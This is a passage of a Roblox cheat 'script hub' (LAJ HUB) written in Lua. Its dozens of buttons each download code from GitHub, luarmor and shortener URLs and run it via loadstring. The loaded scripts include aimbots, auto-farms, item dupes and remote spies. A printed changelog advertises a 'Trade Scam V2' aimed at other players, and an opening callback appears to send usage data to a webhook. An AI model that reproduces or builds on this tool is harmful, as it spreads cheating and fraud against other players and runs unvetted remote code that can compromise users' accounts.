   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood Tab scripts
Tab:CreateButton({
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})

Tab:CreateButton({
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})

Tab:CreateButton({
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})

Tab:CreateButton({
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
-- Fisch Tab
Fin:CreateButton({
   Name = "Speed Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
        executednotify("Speed Hub")
   end,
})


Fin:CreateButton({
   Name = "ThanHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        executednotify("ThanHub")
   end,
})

Fin:CreateButton({
   Name = "Rift GUI",
   Callback = function()
        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
        executednotify("Rift GUI")
   end,
})

Fin:CreateButton({
   Name = "Hooked Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
        executednotify("Hooked Script")
   end,
})

Fin:CreateButton({
   Name = "HomoHack",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        executednotify("HomoHack")
   end,
})

Fin:CreateButton({
   Name = "Native Hub",
   Callback = function()
        script_key="4JxQ1x@+1"
        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
        executednotify("Native Hub")
   end,
})

Fin:CreateButton({
   Name = "Raito Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
        executednotify("Raito Hub")
   end,
})

Fin:CreateButton({
   Name = "Zenith Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        executednotify("Zenith Hub")
   end,
})

Fin:CreateButton({
   Name = "Lunor Script",
   Callback = function()
        script_key = 'lunor_free_key'
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
        executednotify("Lunor Script")
   end,
})

Fin:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
        executednotify("Ronix Hub")
   end,
})

Fin:CreateButton({
   Name = "IceHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
        executednotify("IceHub")
   end,
})

Fin:CreateButton({
   Name = "Zio Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/LeadMarker/Scripts/main/ZioHubLoad"))()
        executednotify("Zio Hub")
   end,
})

Fin:CreateButton({
   Name = "Shadow Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/xShadow1212/shadowhub/main/fish"))()
        executednotify("Shadow Hub")
   end,
})
-- Basketball Zero script with bypass
BballZero:CreateButton({
   Name = "Ball Control",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
        executednotify("Ball Control")
   end,
})

-- Blue Lock Rivals script
BlueLock:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
        executednotify("LAJ HUB")
   end,
})

BlueLock:CreateButton({
   Name = "Piskasiska Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
        executednotify("Piskasiska Script")
   end,
})


PetSim99:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       -- Load the script from GitHub
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
       executednotify("Airflow UPDATED")
   end,
})
-- Muscle Legend Tab
MuscleLegend:CreateSection("Muscle Legend Scripts")

MuscleLegend:CreateButton({
   Name = "Muscle Legend Script",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
       executednotify("Muscle Legend Script")
   end,
})

-- Universal Tab Scripts
Universal:CreateButton({
   Name = "Infinite Yield FE",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify("Infinite Yield FE")
   end,
})

Universal:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
       executednotify("Dex Explorer")
   end,
})

Universal:CreateButton({
   Name = "Hydroxide",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
       executednotify("Hydroxide")
   end,
})

Universal:CreateButton({
   Name = "SimpleSpy",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
       executednotify("SimpleSpy")
   end,
})

Universal:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify("Airflow UPDATED")
   end,
})

Universal:CreateButton({
   Name = "Domain X",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify("Domain X")
   end,
})


-- Settings Tab
local idled_Connection

local function onIdled()
    if game then
        game:GetService("VirtualUser"):CaptureController()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
    end
end

Settings:CreateButton({
    Name = "Anti AFK",
    Callback = function()
        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
            executednotify("Anti AFK")
        end
    end,
})

local Inf_jump = false
local jumpConnection = nil

Settings:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
      Inf_jump = Value
      
      -- Disconnect previous connection if it exists
      if jumpConnection then
          jumpConnection:Disconnect()
          jumpConnection = nil
      end
      
      -- Only create a new connection if Inf_jump is enabled and in game environment
      if Inf_jump and game then
          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
             if Inf_jump and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})

-- Credit section
local creditSection = MainTab:CreateSection("Credits")

MainTab:CreateLabel("Created by LAJ Hub Team")
MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
MainTab:CreateLabel("* Optimized for Swift Executor")

-- Print Swift compatibility notice
print("LAJ HUB - Swift Compatible Version")
print("All HTTP requests have been optimized for Swift executor")
print("This version includes:")
print("1. Full Swift compatibility")
print("2. Pet Sim 99 Tab with new Trade Scam V2")
print("3. All scripts updated to work with Swift")
print("4. Improved executor detection")

-- Rivals Tab
Rivals:CreateSection("Rivals Scripts")
 
Rivals:CreateButton({
   Name = "Azure Mod",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
        executednotify("Azure Mod")
   end,
})

Rivals:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
        executednotify("Tbao Hub")
   end,
})

Rivals:CreateButton({
   Name = "8Bits Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        executednotify("8Bits Hub")
   end,
})

Rivals:CreateButton({
   Name = "Venox Hub",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify("Venox Hub")
   end,
})

Rivals:CreateButton({
   Name = "Lunax Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        executednotify("Lunax Hub")
   end,
})

Rivals:CreateButton({
   Name = "Ventures.lua",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
        executednotify("Ventures.lua")
   end,
})

Rivals:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
        executednotify("Ronix Hub")
   end,
})

Rivals:CreateButton({
   Name = "PinguinRVS",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
        executednotify("PinguinRVS")
   end,
})

Rivals:CreateButton({
   Name = "Zypherion",
   Callback = function()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify("Zypherion")
   end,
})

Rivals:CreateButton({
   Name = "Auto Farm Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
        executednotify("Auto Farm Hub")
   end,
})

Rivals:CreateButton({
   Name = "Rybow Aimbot",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify("Rybow Aimbot")
   end,
})

Rivals:CreateButton({
   Name = "Xera Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
        executednotify("Xera Script")
   end,
})

Rivals:CreateButton({
   Name = "Minimal Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
        executednotify("Minimal Hub")
   end,
})
-- Dead Rails Tab
DeadRails:CreateSection("Dead Rails Scripts")

DeadRails:CreateButton({
   Name = "Markk Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify("Markk Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Farx11122 Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
       executednotify("Farx11122 Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "SpiderXHub Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
       executednotify("SpiderXHub Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Strelizia Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
       executednotify("Strelizia Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Rinns Dead Rails No Key",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
       executednotify("Rinns Dead Rails No Key")
   end,
})

DeadRails:CreateButton({
   Name = "Auto Farm Bond",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
       executednotify("Auto Farm Bond")
   end,
})

DeadRails:CreateButton({
   Name = "Lomu Hub",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify("Lomu Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Neox Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
       executednotify("Neox Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Sypher Hub OP",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
       executednotify("Sypher Hub OP")
   end,
})

DeadRails:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
       executednotify("Tbao Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Karol Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
       executednotify("Karol Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Dead Rails Alpha Script",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
       executednotify("Dead Rails Alpha Script")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
       executednotify("Airflow UPDATED")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
       executednotify("Airflow UPDATED")
   end,
})

-- BloxFruits Tab Scripts
BloxFruits:CreateSection("Blox Fruits Scripts")

-- Murder Mystery Tab Content 
MurderMystery:CreateSection("🔥 MURDER MYSTERY COMING SOON 🔥") 

MurderMystery:CreateLabel("COMING SOON WAIT LIL BRO") 

MurderMystery:CreateParagraph({ 
    Title = "Under Development", 
    Content = "The Murder Mystery script is currently in development and will be available in a future update. Please check back later for this exciting addition to LAJ HUB!" 
}) 

MurderMystery:CreateButton({ 
    Name = "Join Discord for Updates", 
    Callback = function() 
        setclipboard("https://discord.gg/4mgdcfvAJU") 
        Rayfield:Notify({ 
            Title = "Discord Link Copied", 
            Content = "The Discord link has been copied to your clipboard!", 
            Duration = 5, 
            Image = 9725800107, 
            Actions = { 
                Ignore = { 
                    Name = "OK", 
                    Callback = function() end 
                } 
            } 
        }) 
    end 
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})


BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})
